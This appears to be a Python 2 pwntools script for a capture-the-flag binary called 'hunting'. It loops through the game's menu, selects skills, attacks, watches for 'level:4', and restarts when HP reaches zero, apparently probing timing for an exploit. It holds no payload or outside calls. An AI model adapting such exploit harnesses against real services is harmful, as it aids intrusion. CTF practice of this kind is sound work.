#!/usr/bin/python
from pwn import *
import time

while True:
    p = process("./hunting")
    time.sleep(1)
    print p.recvuntil("Exit")
    p.sendline("3")
    print p.recvuntil("hollylight")
    p.sendline("3")
    print p.recvuntil("choice:")
    print p.recvuntil("Exit")
    lv4=0
    while True:
        if lv4==1:
            p.sendline("3")
            print p.recvuntil("hollylight")
            p.sendline("9")
            print p.recvuntil("choice:")
            print p.recvuntil("Exit")
        p.sendline("2")
        time.sleep(1.3)
        print p.recvuntil("Skill Activation")
        data = p.recvuntil("=======================================")
        print data
        if "level:4" in data:
            print "*************************************Level4       !!!!!!!!!!"
            print "*************************************Level4       !!!!!!!!!!"
            print "*************************************Level4       !!!!!!!!!!"
            lv4=1
        p.sendline("1")
        data = p.recvline()
        data = p.recvline()
        print data
        if 'HP is 0' in data:
            print 'DIEEEEEEEEEEEEEEEEEEEEEEEE'
            p.close()
            break
        #print p.recvuntil("6.")

